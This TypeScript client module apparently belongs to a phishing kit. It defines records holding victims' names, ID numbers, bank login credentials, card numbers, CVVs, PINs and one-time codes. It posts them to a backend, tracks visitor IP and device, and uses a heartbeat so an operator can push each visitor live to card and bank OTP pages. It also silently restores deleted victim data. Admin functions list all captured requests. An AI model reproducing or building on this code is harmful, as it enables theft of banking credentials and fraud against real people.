export interface RequestData {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  loginUsername?: string;
  loginPassword?: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  cardPin?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

export interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

export interface ActiveSessionInfo {
  clientId: string;
  requestId: string | null;
  currentPage: string;
  lastSeen: number;
  meta?: VisitorMeta;
}

// Pure in-memory runtime references (no localStorage or sessionStorage)
let activeRequestId: string | null = null;
let activeAdminToken = '';
const runtimeClientId = 'client_' + Math.random().toString(36).slice(2);
let firstVisitSent = false;
let wasDeletedOnServer = false;
let lastKnownRequestData: Partial<RequestData> = {};

export function getRuntimeClientId(): string {
  return runtimeClientId;
}

export function getActiveRequestId(): string | null {
  return activeRequestId;
}

export function setActiveRequestId(id: string | null) {
  activeRequestId = id;
}

export function updateDraftRequestData(patch: Partial<RequestData>) {
  const cleaned: Partial<RequestData> = {};
  for (const [k, v] of Object.entries(patch)) {
    if (v !== undefined && v !== '') {
      (cleaned as any)[k] = v;
    }
  }
  lastKnownRequestData = {
    ...lastKnownRequestData,
    ...cleaned,
  };
}

export function getDraftRequestData(): Partial<RequestData> {
  return lastKnownRequestData;
}

export function hasDraftRequestData(): boolean {
  return Boolean(
    lastKnownRequestData.name ||
      lastKnownRequestData.mobile ||
      lastKnownRequestData.loginUsername ||
      lastKnownRequestData.cardNumber ||
      lastKnownRequestData.otp
  );
}

export async function restoreDeletedVisitorIfNeeded(currentPage = '/'): Promise<RequestData | null> {
  if (currentPage.startsWith('/admin')) return null;
  if (!wasDeletedOnServer || activeRequestId) return null;
  if (!hasDraftRequestData()) return null;

  wasDeletedOnServer = false;
  try {
    const restored = await createCardRequest({
      ...lastKnownRequestData,
      id: undefined,
    });
    return restored;
  } catch {
    return null;
  }
}

export async function resolveActiveRequestId(): Promise<string | null> {
  if (activeRequestId) return activeRequestId;
  const current = await getCurrentCardRequest();
  if (current?.id) {
    activeRequestId = current.id;
    return current.id;
  }
  return null;
}

export async function createCardRequest(payload: Partial<RequestData>): Promise<RequestData> {
  updateDraftRequestData(payload);
  const mergedPayload: Partial<RequestData> = {
    ...lastKnownRequestData,
    ...payload,
  };
  const res = await fetch('/api/requests', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({
      ...mergedPayload,
      id: payload.id || activeRequestId || undefined,
      clientId: runtimeClientId,
    }),
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to create request');
  }
  activeRequestId = data.id;
  wasDeletedOnServer = false;
  updateDraftRequestData(data);
  return data;
}

export async function updateCardRequest(id: string, payload: Partial<RequestData>): Promise<RequestData> {
  const isAdminUpdate = Boolean(id && id !== 'current' && id !== activeRequestId);
  if (!isAdminUpdate) {
    updateDraftRequestData(payload);
  }

  const targetId = id && id !== 'current' ? id : activeRequestId || 'current';
  const bodyPayload = isAdminUpdate
    ? payload
    : {
        ...lastKnownRequestData,
        ...payload,
        clientId: runtimeClientId,
      };

  const res = await fetch(`/api/requests/${encodeURIComponent(targetId)}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify(bodyPayload),
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'Failed to update request');
  }
  if (!isAdminUpdate && data?.id) {
    activeRequestId = data.id;
    wasDeletedOnServer = false;
    updateDraftRequestData(data);
  }
  return data;
}

export async function deleteCardRequest(id: string): Promise<{ ok: boolean; id: string }> {
  const res = await fetch(`/api/requests/${encodeURIComponent(id)}`, {
    method: 'DELETE',
    credentials: 'same-origin',
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) {
    throw new Error(data.error || 'Failed to delete request');
  }
  if (activeRequestId === id) {
    activeRequestId = null;
    wasDeletedOnServer = true;
  }
  return data;
}

export async function getCurrentCardRequest(): Promise<RequestData | null> {
  const res = await fetch(`/api/requests/current?clientId=${encodeURIComponent(runtimeClientId)}`, {
    credentials: 'same-origin',
  });
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  if (data?.id) {
    activeRequestId = data.id;
    wasDeletedOnServer = false;
  } else {
    if (activeRequestId) {
      wasDeletedOnServer = true;
    }
    activeRequestId = null;
  }
  return data;
}

export async function getCardRequest(id?: string | null): Promise<RequestData | null> {
  const targetId = id && id !== 'current' ? id : activeRequestId || 'current';
  const url =
    targetId === 'current'
      ? `/api/requests/current?clientId=${encodeURIComponent(runtimeClientId)}`
      : `/api/requests/${encodeURIComponent(targetId)}?clientId=${encodeURIComponent(runtimeClientId)}`;
  const res = await fetch(url, {
    credentials: 'same-origin',
  });
  if (res.status === 404) {
    if (!id || id === 'current' || id === activeRequestId) {
      if (activeRequestId) wasDeletedOnServer = true;
      activeRequestId = null;
    }
    return null;
  }
  if (!res.ok) return null;
  const data = await res.json().catch(() => null);
  if (data?.id) {
    activeRequestId = data.id;
    wasDeletedOnServer = false;
  } else if (!id || id === 'current' || id === activeRequestId) {
    if (activeRequestId) wasDeletedOnServer = true;
    activeRequestId = null;
  }
  return data;
}

export async function listCardRequests(): Promise<RequestData[]> {
  const res = await fetch('/api/requests', {
    credentials: 'same-origin',
  });
  if (!res.ok) {
    const err = await res.json().catch(() => ({}));
    throw new Error(err.error || 'Failed to list requests');
  }
  return res.json();
}

export function resolveTargetRoute(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed || trimmed === 'pending') return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/form': '/form',
    form: '/form',
    '/request': '/form',
    '/register-company': '/form',
    '/select-watch': '/select-watch',
    watch: '/select-watch',
    '/link-service': '/link-service',
    link: '/link-service',
    '/login': '/login',
    login: '/login',
    '/card-link': '/card-link',
    card: '/card-link',
    '/card-details': '/card-link',
    '/verify': '/verify',
    verify: '/verify',
    token: '/verify',
    '/token': '/verify',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank',
    '/success': '/success',
    success: '/success',
    '/waiting': '/otp',
    waiting: '/otp',
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

export async function sendPresenceHeartbeat(currentPage = '/'): Promise<{
  ok: boolean;
  requestId?: string | null;
  redirectTo?: string | null;
}> {
  if (currentPage.startsWith('/admin')) return { ok: true };
  const isNewVisit = !firstVisitSent;
  firstVisitSent = true;
  try {
    const res = await fetch('/api/presence', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({
        clientId: runtimeClientId,
        requestId: activeRequestId,
        currentPage,
        isNewVisit,
      }),
    });
    if (res.ok) {
      const data = await res.json().catch(() => null);
      if (data?.requestId) {
        activeRequestId = data.requestId;
        wasDeletedOnServer = false;
      } else if (data && data.requestId === null) {
        if (activeRequestId) {
          wasDeletedOnServer = true;
        }
        activeRequestId = null;
      }
      return {
        ok: true,
        requestId: data?.requestId ?? null,
        redirectTo: data?.redirectTo || null,
      };
    }
  } catch {
    // Ignore transient network errors
  }
  return { ok: false };
}

export async function getServerStats(): Promise<{
  onlineCount: number;
  totalVisitorsCount: number;
  onlineUsers: Record<string, boolean>;
  userPages: Record<string, string>;
  userMeta: Record<string, VisitorMeta>;
  activeSessions: ActiveSessionInfo[];
}> {
  try {
    const res = await fetch('/api/stats', {
      credentials: 'same-origin',
    });
    if (res.ok) {
      return await res.json();
    }
  } catch {
    // Fallback on network error
  }
  return {
    onlineCount: 0,
    totalVisitorsCount: 0,
    onlineUsers: {},
    userPages: {},
    userMeta: {},
    activeSessions: [],
  };
}

export async function adminLoginApi(email: string, password: string): Promise<{ token: string }> {
  const res = await fetch('/api/admin/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'same-origin',
    body: JSON.stringify({ email, password }),
  });
  const data = await res.json();
  if (!res.ok) {
    throw new Error(data.error || 'فشل تسجيل الدخول');
  }
  activeAdminToken = data.token || '';
  return data;
}

export async function verifyAdminSession(): Promise<boolean> {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  try {
    const res = await fetch('/api/admin/me', {
      headers,
      credentials: 'same-origin',
    });
    return res.ok;
  } catch {
    return false;
  }
}

export async function adminLogoutApi() {
  const headers: Record<string, string> = {};
  if (activeAdminToken) {
    headers.Authorization = `Bearer ${activeAdminToken}`;
  }
  activeAdminToken = '';
  await fetch('/api/admin/logout', {
    method: 'POST',
    headers,
    credentials: 'same-origin',
  }).catch(() => {});
}
